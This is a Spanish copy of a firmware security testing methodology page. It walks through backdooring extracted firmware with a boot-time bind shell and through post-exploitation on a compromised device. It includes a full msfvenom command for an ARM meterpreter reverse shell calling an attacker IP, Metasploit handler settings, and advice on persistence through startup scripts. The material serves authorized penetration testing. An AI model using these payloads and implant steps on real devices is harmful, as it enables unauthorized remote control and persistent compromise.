### Esta página fue copiada de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Intenta **subir firmware personalizado y/o binarios compilados** para encontrar fallas de integridad o verificación de firma. Por ejemplo, compila un backdoor bind shell que se inicie al arrancar siguiendo los siguientes pasos.

1. Extrae el firmware con firmware-mod-kit (FMK)
2. Identifica la arquitectura y el endianness del firmware objetivo
3. Construye un compilador cruzado con Buildroot o usa otros métodos que se adapten a tu entorno
4. Usa el compilador cruzado para construir el backdoor
5. Copia el backdoor a /usr/bin del firmware extraído
6. Copia el binario QEMU apropiado al rootfs del firmware extraído
7. Emula el backdoor usando chroot y QEMU
8. Conéctate al backdoor a través de netcat
9. Elimina el binario QEMU del rootfs del firmware extraído
10. Empaqueta el firmware modificado con FMK
11. Prueba el firmware con backdoor emulado con firmware analysis toolkit (FAT) y conectándote a la dirección IP y puerto del backdoor objetivo usando netcat

Si ya se ha obtenido una shell de root a través de análisis dinámico, manipulación del bootloader o medios de prueba de seguridad de hardware, intenta ejecutar binarios maliciosos precompilados como implantes o reverse shells. Considera el uso de herramientas de carga útil/implante automatizadas utilizadas para frameworks de comando y control (C\&C). Por ejemplo, el framework Metasploit y 'msfvenom' se pueden aprovechar siguiendo los siguientes pasos.

1. Identifica la arquitectura y el endianness del firmware objetivo
2. Usa `msfvenom` para especificar la carga útil de destino adecuada (-p), la dirección IP del host del atacante (LHOST=), el número de puerto de escucha (LPORT=), el tipo de archivo (-f), la arquitectura (--arch), la plataforma (--platform linux o windows) y el archivo de salida (-o). Por ejemplo, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transfiere la carga útil al dispositivo comprometido (por ejemplo, ejecuta un servidor web local y usa wget/curl para transferir la carga útil al sistema de archivos) y asegúrate de que tenga permisos de ejecución
4. Prepara Metasploit para manejar solicitudes entrantes. Por ejemplo, inicia Metasploit con msfconsole y usa la siguiente configuración de acuerdo con la carga útil anterior: use exploit/multi/handler,
   * `set payload linux/armle/meterpreter_reverse_tcp`
   * `set LHOST 192.168.1.245 #dirección IP del host del atacante`
   * `set LPORT 445 #puede ser cualquier puerto no utilizado`
   * `set ExitOnSession false`
   * `exploit -j -z`
5. Ejecuta el reverse shell meterpreter en el dispositivo comprometido
6. Observa las sesiones de meterpreter abiertas
7. Realiza actividades de post-explotación

Si es posible, identifica una vulnerabilidad dentro de los scripts de inicio para obtener acceso persistente a un dispositivo a través de reinicios. Estas vulnerabilidades surgen cuando los scripts de inicio hacen referencia, [crean enlaces simbólicos](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data) o dependen de código ubicado en ubicaciones montadas no confiables como tarjetas SD y volúmenes flash utilizados para almacenar datos fuera de los sistemas de archivos raíz.
